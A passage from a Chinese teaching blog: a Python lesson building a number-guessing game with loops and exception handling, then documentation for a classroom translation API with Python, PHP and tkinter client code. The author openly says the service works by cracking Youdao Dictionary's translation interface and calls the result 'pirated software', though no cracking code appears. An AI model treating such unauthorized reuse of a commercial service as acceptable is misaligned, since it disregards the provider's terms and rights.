class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>程序是不是报错了呢？想想问题出在哪里？<br>请用刚才学习的if语句继续完成我们的项目吧。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random random_number <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'系统自动产生的随机数：'</span><span class="token punctuation">,</span>random_number<span class="token punctuation">)</span> guess_number <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入0到100之间的数:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">if</span>  guess_number <span class="token operator">&gt;</span> random_number<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'大了'</span><span class="token punctuation">)</span><span class="token keyword">elif</span> guess_number <span class="token operator">&lt;</span> random_number<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'小了'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'猜对了'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="9-while循环"><a href="#9-while循环" class="headerlink" title="9.while循环"></a>9.while循环</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">a <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> a <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> a <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    password <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入密码'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> password <span class="token operator">==</span> <span class="token string">'8888'</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'密码正确'</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'密码错误'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>另一种写法。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">password <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">while</span> password<span class="token operator">!=</span><span class="token string">'8888'</span><span class="token punctuation">:</span>    password<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入密码'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'密码正确'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>回到项目中，用户可以一直猜，直到猜中为止，才结束循环，应该怎么做。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random random_number <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'系统自动产生的随机数：'</span><span class="token punctuation">,</span>random_number<span class="token punctuation">)</span> <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    guess_number <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入0到100之间的数:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span>  guess_number <span class="token operator">&gt;</span> random_number<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'大了'</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> guess_number <span class="token operator">&lt;</span> random_number<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'小了'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'猜对了'</span><span class="token punctuation">)</span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="10-异常处理"><a href="#10-异常处理" class="headerlink" title="10.异常处理"></a>10.异常处理</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">try</span><span class="token punctuation">:</span>  <span class="token comment">#尝试执行这段代码</span><span class="token keyword">except</span><span class="token punctuation">:</span>  <span class="token comment">#如果出错就执行这段代码，否则不执行</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在我们的项目中，如果用户输入的不是数字，会发生什么错误，应该怎么解决呢？</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random random_number <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'系统自动产生的随机数：'</span><span class="token punctuation">,</span>random_number<span class="token punctuation">)</span> <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        guess_number <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入0到100之间的数:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'你输入的不是数字，请重新输入吧'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span>  guess_number <span class="token operator">&gt;</span> random_number<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'大了'</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> guess_number <span class="token operator">&lt;</span> random_number<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'小了'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'猜对了'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="11-循环控制"><a href="#11-循环控制" class="headerlink" title="11.循环控制"></a>11.循环控制</h2><ul><li>break 跳出全部循环</li><li>continue 跳出本次循环<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random random_number <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'系统自动产生的随机数：'</span><span class="token punctuation">,</span>random_number<span class="token punctuation">)</span> <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        guess_number <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入0到100之间的数:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'你输入的不是数字，请重新输入吧'</span><span class="token punctuation">)</span>        <span class="token keyword">continue</span>    <span class="token keyword">if</span>  guess_number <span class="token operator">&gt;</span> random_number<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'大了'</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> guess_number <span class="token operator">&lt;</span> random_number<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'小了'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'猜对了'</span><span class="token punctuation">)</span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="12-循环…else…"><a href="#12-循环…else…" class="headerlink" title="12.循环…else…"></a>12.循环…else…</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> i<span class="token operator">&lt;</span><span class="token number">5</span><span class="token punctuation">:</span>     i <span class="token operator">=</span> i<span class="token operator">+</span><span class="token number">1</span>    a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入密码，你有5次机会猜出密码:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> a <span class="token operator">==</span> <span class="token number">8888</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'你触发了break语句，导致else语句不会生效。'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'5次循环你都没猜出密码，else语句生效了。'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="13-for-in-循环"><a href="#13-for-in-循环" class="headerlink" title="13.for..in..循环"></a>13.for..in..循环</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">'小明'</span><span class="token punctuation">,</span><span class="token string">'小红'</span><span class="token punctuation">,</span><span class="token string">'小王'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>   <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>也可以使用range函数来产生一系列数字：<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>回到项目中来，如果规定只能猜五次，超过五次就游戏失败，应该怎么做呢？<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random random_number <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'系统自动产生的随机数：'</span><span class="token punctuation">,</span>random_number<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        guess_number <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入0到100之间的数:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'你输入的不是数字，请重新输入吧'</span><span class="token punctuation">)</span>        <span class="token keyword">continue</span>    <span class="token keyword">if</span>  guess_number <span class="token operator">&gt;</span> random_number<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'大了'</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> guess_number <span class="token operator">&lt;</span> random_number<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'小了'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'猜对了,你一共猜了'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'次'</span><span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'猜了5次都没猜到，游戏失败'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p><span class="github-emoji"><span>😎</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f60e.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span><span class="github-emoji"><span>😎</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f60e.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span><span class="github-emoji"><span>😎</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f60e.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span><span class="github-emoji"><span>😎</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f60e.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span><span class="github-emoji"><span>😎</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f60e.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span><span class="github-emoji"><span>😎</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f60e.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span><span class="github-emoji"><span>😎</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f60e.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span><span class="github-emoji"><span>😎</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f60e.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 项目教学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利神翻译接口调用文档</title>
      <link href="/2021/03/26/%E5%88%A9%E7%A5%9E%E7%BF%BB%E8%AF%91%E6%8E%A5%E5%8F%A3%E8%B0%83%E7%94%A8%E6%96%87%E6%A1%A3/"/>
      <url>/2021/03/26/%E5%88%A9%E7%A5%9E%E7%BF%BB%E8%AF%91%E6%8E%A5%E5%8F%A3%E8%B0%83%E7%94%A8%E6%96%87%E6%A1%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="一、制作背景"><a href="#一、制作背景" class="headerlink" title="一、制作背景"></a>一、制作背景</h2><p>在我的观念里，编程是一个通过查文档解决实际问题、最终不断完善产品的过程，理所应当要借助于网络，否则Python的几十万个第三方库怎么记得住呢？编程不能是死记硬背教材上的知识点，而是学习一种方法，一种思维。<br>但在中职学校，由于学生自制力差，不能开外网，只能反复学习教材上的知识，然后完成教材后的习题，我觉得这是一个值得思考的问题。<br>因此，我开发的项目教学旨在完全脱离教材完成综合项目，我又安装了pylint插件使得学生可以查看本地的文档，但是这又产生了一个新的问题，学生抱怨英语看不懂。<br>综上所述，我花了老大力气，做了一个翻译接口，这下看不懂的英语可以直接翻译，无需外网，翻译几遍总能记住，这下总没借口了吧。<br>原理其实很简单，当然不是我的电脑放了一个本地词典，因为大家其实也发现了，这个是可以翻译句子的，而且支持几十种语言。🤠<br>实际上是通过破解有道词典的翻译接口，最终的翻译服务并不是我提供的，如果某一天接口不能用的，应该就是有道词典的加密系统维护升级了😅</p><h2 id="二、接口调用"><a href="#二、接口调用" class="headerlink" title="二、接口调用"></a>二、接口调用</h2><p>HTTP 方法：<code>POST</code></p><p>请求URL：<code>http://10.163.72.55:5000/todo1</code></p><p>URL参数：</p><p>​    data：需要翻译的内容</p><p>返回：</p><p>​    data{</p><p>​        content：翻译完成的内容</p><p>​    }</p><h2 id="三、请求示例"><a href="#三、请求示例" class="headerlink" title="三、请求示例"></a>三、请求示例</h2><h3 id="1-Python"><a href="#1-Python" class="headerlink" title="1.Python"></a>1.Python</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> requests <span class="token keyword">import</span> put<span class="token punctuation">,</span> gethtml<span class="token operator">=</span>put<span class="token punctuation">(</span><span class="token string">'http://10.163.72.55:5000/todo1'</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'data'</span><span class="token punctuation">:</span> <span class="token string">'I am a student'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span>html<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-PHP"><a href="#2-PHP" class="headerlink" title="2.PHP"></a>2.PHP</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// 解码,Unicode转义(\uXXXX)的编码和解码</span><span class="token keyword">function</span> <span class="token function-definition function">decodeUnicode</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">preg_replace_callback</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\\\\u([0-9a-f]{4})/i'</span><span class="token punctuation">,</span>        <span class="token function">create_function</span><span class="token punctuation">(</span>            <span class="token string single-quoted-string">'$matches'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'return mb_convert_encoding(pack("H*", $matches[1]), "UTF-8", "UCS-2BE");'</span>        <span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function-definition function">curlrequest</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">,</span><span class="token variable">$method</span><span class="token operator">=</span><span class="token string single-quoted-string">'post'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//初始化CURL句柄</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置请求的URL</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设为TRUE把curl_exec()结果转化为字串，而不是直接输出</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_CUSTOMREQUEST</span><span class="token punctuation">,</span> <span class="token variable">$method</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置请求方式</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_HTTPHEADER</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">"X-HTTP-Method-Override: <span class="token interpolation"><span class="token variable">$method</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置HTTP头信息</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_POSTFIELDS</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置提交的字符串</span>    <span class="token variable">$document</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//执行预定义的CURL</span>    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$document</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'http://10.163.72.55:5000/todo1'</span><span class="token punctuation">;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"data=<span class="token interpolation"><span class="token variable">$content</span></span>"</span><span class="token punctuation">;</span>    <span class="token variable">$return</span> <span class="token operator">=</span> <span class="token function">curlrequest</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'put'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// ajax异步返回数据</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$a</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$return</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="四、制作前端窗口"><a href="#四、制作前端窗口" class="headerlink" title="四、制作前端窗口"></a>四、制作前端窗口</h2><p>教大家如何制作一个漂亮的前端窗口，既然是做盗版软件就做得像一点。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> json<span class="token keyword">from</span> tkinter <span class="token keyword">import</span> Tk<span class="token punctuation">,</span>Button<span class="token punctuation">,</span>Entry<span class="token punctuation">,</span>Label<span class="token punctuation">,</span>Text<span class="token punctuation">,</span>END<span class="token comment"># 对利神翻译接口发起请求，获得数据</span><span class="token keyword">class</span> <span class="token class-name">LiShenFanYi</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token keyword">def</span> <span class="token function">crawl</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>word<span class="token punctuation">)</span><span class="token punctuation">:</span>        html <span class="token operator">=</span> requests<span class="token punctuation">.</span>put<span class="token punctuation">(</span><span class="token string">'http://10.163.72.55:5000/todo1'</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'data'</span><span class="token punctuation">:</span> word<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> html<span class="token comment"># 前段窗口应用程序</span><span class="token keyword">class</span> <span class="token class-name">Application</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>window <span class="token operator">=</span> Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>fanyi <span class="token operator">=</span> LiShenFanYi<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>window<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">u'我的翻译'</span><span class="token punctuation">)</span>  <span class="token comment"># 设置标题</span>        <span class="token comment">#设置窗口大小和位置</span>        self<span class="token punctuation">.</span>window<span class="token punctuation">.</span>geometry<span class="token punctuation">(</span><span class="token string">'310x370+500+300'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>window<span class="token punctuation">.</span>minsize<span class="token punctuation">(</span><span class="token number">310</span><span class="token punctuation">,</span><span class="token number">370</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>window<span class="token punctuation">.</span>maxsize<span class="token punctuation">(</span><span class="token number">310</span><span class="token punctuation">,</span><span class="token number">370</span><span class="token punctuation">)</span>        <span class="token comment">#创建一个文本框</span>        <span class="token comment">#self.entry = Entry(self.window)</span>        <span class="token comment">#self.entry.place(x=10,y=10,width=200,height=25)</span>        <span class="token comment">#self.entry.bind("&lt;Key-Return&gt;",self.submit1)</span>        self<span class="token punctuation">.</span>result_text1 <span class="token operator">=</span> Text<span class="token punctuation">(</span>self<span class="token punctuation">.</span>window<span class="token punctuation">,</span>background <span class="token operator">=</span> <span class="token string">'azure'</span><span class="token punctuation">)</span> <span class="token comment"># 设置背景颜色</span>        self<span class="token punctuation">.</span>result_text1<span class="token punctuation">.</span>place<span class="token punctuation">(</span>x <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">,</span>y <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">,</span>width <span class="token operator">=</span> <span class="token number">285</span><span class="token punctuation">,</span>height <span class="token operator">=</span> <span class="token number">155</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>result_text1<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token string">"&lt;Key-Return&gt;"</span><span class="token punctuation">,</span>self<span class="token punctuation">.</span>submit1<span class="token punctuation">)</span>        <span class="token comment">#创建一个按钮，并为按钮添加事件</span>        self<span class="token punctuation">.</span>submit_btn <span class="token operator">=</span> Button<span class="token punctuation">(</span>self<span class="token punctuation">.</span>window<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">u'翻译'</span><span class="token punctuation">,</span>command<span class="token operator">=</span>self<span class="token punctuation">.</span>submit<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>submit_btn<span class="token punctuation">.</span>place<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">205</span><span class="token punctuation">,</span>y<span class="token operator">=</span><span class="token number">165</span><span class="token punctuation">,</span>width<span class="token operator">=</span><span class="token number">35</span><span class="token punctuation">,</span>height<span class="token operator">=</span><span class="token number">25</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>submit_btn2 <span class="token operator">=</span> Button<span class="token punctuation">(</span>self<span class="token punctuation">.</span>window<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">u'清空'</span><span class="token punctuation">,</span>command <span class="token operator">=</span> self<span class="token punctuation">.</span>clean<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>submit_btn2<span class="token punctuation">.</span>place<span 